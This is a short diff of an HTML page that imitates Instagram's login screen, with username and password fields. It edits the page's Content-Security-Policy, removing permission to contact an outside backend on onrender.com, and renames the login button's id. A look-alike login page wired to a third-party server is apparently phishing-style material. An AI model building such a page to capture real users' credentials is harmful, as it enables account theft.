@@ -8,9 +8,9 @@
     <meta http-equiv="Content-Security-Policy" content="
     default-src 'self'; 
     img-src 'self' https://upload.wikimedia.org data:; 
-    script-src 'self'; 
-    connect-src 'self' https://backend-redf.onrender.com;
-">
+    script-src 'self';
+    ">
+
     <title>Instagram Login</title>
     <link rel="stylesheet" href="index.css">
 </head>
@@ -21,7 +21,7 @@
         <div class="separator"><span>OR</span></div>
         <input type="text" placeholder="Phone number, username, or email" id="username">
         <input type="password" placeholder="Password" id="password">
-        <button class="login-btn" id="login-btn">Log In</button> <!-- ✅ Removed inline script -->
+        <button class="login-btn" id="loginBtn">Log In</button> <!-- ✅ Removed inline script -->
         <a href="#" class="forgot-password">Forgot password?</a>
         <div class="signup-link">Don't have an account? <a href="#">Sign up</a></div>
     </div>
